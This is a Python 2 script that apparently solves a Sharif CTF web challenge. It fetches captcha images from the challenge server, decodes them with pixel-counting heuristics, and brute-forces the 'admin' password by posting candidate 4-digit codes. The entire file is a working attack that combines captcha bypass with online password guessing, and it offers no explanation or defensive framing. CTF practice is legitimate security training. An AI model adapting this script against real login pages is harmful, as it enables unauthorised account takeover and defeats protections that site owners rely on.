import os,sys
from PIL import Image
import mechanize
import cookielib
from bs4 import BeautifulSoup
import urllib

base_url = 'http://ctf.sharif.edu:32455/chal/oldpersian/6a18d45a981e0219/'
captcha_link = base_url + 'captcha/'
login_link = base_url + 'login/submit/'

password_from = int(sys.argv[1])
password_to = int(sys.argv[2])

captcha_image_name = 'test.jpg'
alphabet_chars = 'ABCDEFGHIJKLM'
captcha_char_numbers = 6

def get_captcha(br):
    result = br.open(captcha_link)
    img = open(captcha_image_name,'wb')
    img.write(result.read())
    img.close()

def calc_black_pixs(pix_list):

    this_y = len(pix_list)
    this_x = len(pix_list[0])
    result = 0
    for i in pix_list:
        for j in i:
            if j == 0:
                result += 1
    return result

def calc_each_quarter_black_pixels(pix_list):
    result = [[0,0],[0,0]]      # [1_1, 1_2], [2_1, 2_2]
    for y in pix_list:
        y_index = pix_list.index(y)
        for x in y:
            x_index = y.index(x)
            if x == 0:
                result_x = 0
                if x_index > 40:
                    result_x = 1
                result_y = 0
                if y_index > 40:
                    result_y = 1

                result[result_y][result_x] += 1
    return result

def proccess_captcha():
    jpg_image = Image.open(captcha_image_name)
    jpg_tmp = jpg_image.convert('L')
    gray_image = jpg_tmp.point(lambda x: 0 if x<128 else 255, '1')
    mx,my = gray_image.size
    pixels = gray_image.load()

    char_list = []
    for index in range(captcha_char_numbers):
        tmp_char_list = []
        for y in range(my):
            tmp = []
            for x in range(80*index,80*(index+1)):
                this_pix = pixels[x,y]
                tmp.append(this_pix)
            tmp_char_list.append(tmp)
        char_list.append(tmp_char_list)

    result = ''
    for index in range(captcha_char_numbers):
        bp = calc_black_pixs(char_list[index])
        bp_quarters = calc_each_quarter_black_pixels(char_list[index])
        bp_left_sum = (bp_quarters[0][0]+bp_quarters[1][0])
        bp_right_sum = (bp_quarters[0][1]+bp_quarters[1][1])
        bp_top_sum = sum(bp_quarters[0])
        bp_bottom_sum = sum(bp_quarters[1])

        if bp > 700:
            result += 'H'
        elif bp <= 160:
            result += 'E'
        elif bp >= 450 and bp <= 470:
            if bp_top_sum > bp_bottom_sum:
                if bp_bottom_sum < 200:
                    result += 'D'
                else:
                    if bp_left_sum > bp_right_sum:
                        result += 'K'
                    else:
                        result += 'B'
            else:
                if bp_left_sum > bp_right_sum:
                    result += 'K'
                else:
                    result += 'B'
        elif bp >= 540 and bp <= 560:
            if bp_top_sum > bp_bottom_sum:
                if bp_left_sum > bp_right_sum:
                    result += 'L'
                else:
                    result += 'M'
            else:
                result += 'L'
        elif bp > 500 and bp < 520:
            result += 'J'
        elif bp >= 640 and bp < 700:
            result += 'F'
        elif bp >= 520 and bp < 540:
            result += 'I'
        elif bp >= 625 and bp < 640:
            result += 'G'
        elif bp > 430 and bp < 450:
            result += 'K'
        elif bp > 600 and bp < 625:
            result += 'A'
        elif bp > 560 and bp < 600:
            result += 'C'
        else:
            result += '-'
    return result

def send_post(br, password, captcha):
    params = {'username':'admin', 'password':password, 'captcha':captcha}
    data = urllib.urlencode(params)
    response = br.open(login_link, data)
    result = response.read()
    if 'Invalid captcha' in result:
        return False
    if 'Login failed' in result:
        return 'failed'
    if 'You are in penalty time' in result:
        return 'penalty'
    return result

#passlist = range(password_from-1,password_to+1)
import itertools
chars = '0123456789'
passlist = []
res = itertools.permutations(chars,3)
for i in res:
    passlist.append('0'+''.join(i))

for password in passlist:
    state = False
    while not state:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        cj = cookielib.LWPCookieJar()
        br.set_cookiejar(cj)
        get_captcha(br)
        this_captcha = proccess_captcha()
        state = send_post(br, password, this_captcha)
        if state == False:
            continue
        else:
            if state == 'failed':
                print '[-] Failed to login with %s'%password
                break
            elif state == 'penalty':
                print '[-] Failed cause of penatly time'
                print password
                raw_input('wait here...')
                break
            else:
                print state
                print '\n[+] Password is %s'%password
                raw_input('got it!\n\n')
